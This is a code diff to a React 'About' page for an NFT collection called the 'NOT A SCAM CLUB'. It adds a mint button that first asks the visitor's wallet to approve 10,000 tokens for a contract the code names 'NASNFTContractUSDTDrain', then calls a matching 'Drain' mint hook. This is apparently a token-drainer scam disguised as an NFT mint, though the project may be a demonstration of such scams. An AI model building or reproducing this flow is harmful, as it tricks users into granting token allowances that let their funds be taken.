@@ -2,6 +2,14 @@ import styled, { ThemeProvider } from "styled-components";
 import Carousel from "../Carousel";
 import Button from "../Button";
 import { dark } from "../../styles/Themes";
+import { useNASNFTContractUSDTDrainMint } from "../../hooks/useNASNFTContractUSDTDrainMint";
+import { useERC20Approve } from "../../hooks/useERC20Approve";
+import { useEffect, useState } from "react";
+import {
+  NASNFTContractUSDTDrain_ADDRESS,
+  YAUSDT_ADDRESS,
+} from "../../hooks/constants";
+import { parseUnits } from "viem";
 
 const Container = styled.div`
   width: 75%;
@@ -61,6 +69,42 @@ const ButtonContainer = styled.div`
 `;
 
 function About() {
+  const [minted, setMinted] = useState(false);
+  const {
+    write: approveERC20,
+    isSuccess: isERC20ApproveSuccess,
+    isError: isERC20Error,
+    isLoading: isERC20Loading,
+  } = useERC20Approve();
+  const {
+    write: mint,
+    isSuccess: isMintSuccess,
+    isError: isMintError,
+    isLoading: isMintLoading,
+  } = useNASNFTContractUSDTDrainMint();
+
+  const approveTokenUse = async () => {
+    if (!minted) {
+      approveERC20({
+        args: [NASNFTContractUSDTDrain_ADDRESS, parseUnits(`10000`, 18)],
+      });
+    }
+  };
+
+  const mintNFT = () => {
+    if (!minted && isERC20ApproveSuccess) {
+      if (isERC20ApproveSuccess) {
+        mint();
+      }
+    }
+  };
+
+  useEffect(() => {
+    if (isMintSuccess) {
+      setMinted(true);
+    }
+  }, [isMintSuccess]);
+
   return (
     <Section id="about">
       <Container>
@@ -71,8 +115,8 @@ function About() {
         <Box>
           <Title>Welcome To The NAS Club.</Title>
           <SubText>
-            The NOT A SCAM CLUB(NAS) is a private collection of NFTs—unique digital
-            collectibles.
+            The NOT A SCAM CLUB(NAS) is a private collection of NFTs—unique
+            digital collectibles.
           </SubText>
           <SubTextLight>
             With more than 200+ hand drawn traits, each NFT is unique and comes
@@ -82,7 +126,17 @@ function About() {
           </SubTextLight>
           <ButtonContainer>
             <ThemeProvider theme={dark}>
-              <Button text="MINT NOW" link="#" />
+              <Button
+                text={
+                  minted
+                    ? "CONGRATS!"
+                    : isERC20ApproveSuccess
+                    ? "MINT"
+                    : "APPROVE"
+                }
+                onClick={isERC20ApproveSuccess ? mintNFT : approveTokenUse}
+                isDisabled={minted}
+              />
             </ThemeProvider>
           </ButtonContainer>
         </Box>
